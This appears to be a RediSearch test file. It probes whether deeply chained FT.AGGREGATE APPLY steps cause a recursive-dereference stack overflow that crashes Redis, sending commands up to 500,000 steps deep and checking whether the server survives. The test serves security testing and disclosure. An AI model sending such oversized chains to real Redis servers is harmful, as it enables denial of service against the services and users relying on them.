"""
POC for CVE-candidate: recursive RSValue dereference stack overflow via FT.AGGREGATE APPLY chains.

Each APPLY @prev AS alias step wraps the previous value in an RSValue::Ref.
During reply serialisation RSValue_Dereference walks the whole chain recursively.
If the chain is deep enough it overflows the native stack and crashes Redis.

This test probes increasing depths to find whether a crash is reachable within
Redis's normal query-buffer and parsing limits. If no depth causes a crash the
vulnerability is not practically exploitable via this code path.
"""
from common import *
import math


def _build_apply_chain_cmd(index, depth):
    """Return an FT.AGGREGATE command with `depth` chained APPLY steps."""
    cmd = ['FT.AGGREGATE', index, '*', 'LOAD', '1', '@v']
    prev = 'v'
    for i in range(depth):
        alias = f'a{i}'
        cmd += ['APPLY', f'@{prev}', 'AS', alias]
        prev = alias
    return cmd


def test_aggregate_apply_chain_stackoverflow(env):
    """Probe increasing APPLY chain depths to find whether a crash is reachable."""
    skipOnExistingEnv(env)

    conn = getConnectionByEnv(env)

    env.expect(
        'FT.CREATE', 'sec_idx', 'ON', 'HASH',
        'SCHEMA', 'v', 'NUMERIC',
    ).ok()
    waitForIndex(env, 'sec_idx')
    conn.execute_command('HSET', 'doc:1', 'v', '1')

    # Test depths growing as powers of 10, starting from 1 000
    depths = [1_000, 10_000, 100_000, 500_000]

    crashed_at = None
    for depth in depths:
        cmd = _build_apply_chain_cmd('sec_idx', depth)
        cmd_bytes = sum(len(str(a)) for a in cmd)
        env.debugPrint(f'Trying depth={depth} (~{cmd_bytes // 1024} KB command)', force=True)

        try:
            env.cmd(*cmd)
            env.debugPrint(f'depth={depth} -> survived', force=True)
        except redis_exceptions.ConnectionError:
            crashed_at = depth
            env.debugPrint(f'depth={depth} -> CRASH (ConnectionError)', force=True)
            break
        except Exception as e:
            env.debugPrint(f'depth={depth} -> error (not a crash): {e}', force=True)
            break

    if crashed_at is not None:
        # Confirm the server is actually dead (not just a transient disconnect)
        new_conn = env.getConnection()
        try:
            new_conn.ping()
            server_alive = True
        except Exception:
            server_alive = False

        env.assertFalse(
            server_alive,
            message=f'Redis crashed at APPLY chain depth={crashed_at} — stack overflow confirmed'
        )
    else:
        env.debugPrint(
            'No crash triggered at any tested depth — '
            'bug may not be exploitable at practical query sizes on this build/platform.',
            force=True,
        )
        # Verify the server is still alive after all probes
        env.expect('PING').noError()
